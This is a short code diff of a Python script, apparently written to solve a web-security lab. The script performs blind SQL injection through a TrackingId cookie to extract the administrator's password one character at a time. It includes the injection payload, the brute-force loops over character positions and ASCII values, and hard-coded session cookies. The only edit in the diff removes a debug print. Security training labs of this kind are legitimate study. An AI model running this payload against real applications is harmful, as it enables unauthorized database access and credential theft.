@@ -13,7 +13,6 @@ def retrieve_password(url):
     for number in range(1,21): # Test each char position for the passoword(the password length is 20 char).
         for ascii_char in range(33,127): # Try the decimal numbers for each char from the ASCII table.
             payload =f"' AND (SELECT ASCII(SUBSTRING(password,{number},1)) FROM users WHERE username='administrator')={ascii_char}--"
-            print(colored("hello","green"))
             cookies={  # You must change it and set the cookies of your request.
                 "TrackingId": "2uFM62rGof2FsWEZ" + payload,
                 "session": "3TzQGczPRWLnOmNypH0tRYU1LgFLhBuy"
